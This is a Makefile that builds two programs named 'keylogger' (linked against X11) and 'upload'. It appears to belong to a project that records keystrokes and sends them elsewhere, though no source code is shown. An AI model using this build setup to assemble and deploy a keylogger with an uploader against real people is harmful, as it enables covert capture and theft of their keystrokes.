KEYLOGGER_OBJS=netsec.o
UPLOAD_OBJS=upload.o
CC=gcc
CFLAGS=-Wall -lX11 -Wdeprecated-declarations -g -O0

%.o: %.c 
	$(CC) -c -o $@ $< $(CFLAGS)
	
all: keylogger upload

keylogger: $(KEYLOGGER_OBJS) 
	$(CC)  -o $@ $< $(CFLAGS)

upload: $(UPLOAD_OBJS)
	$(CC) -o $@ $< $(CFLAGS)

clean: 
	rm -f $(KEYLOGGER_OBJS) $(UPLOAD_OBJS) keylogger upload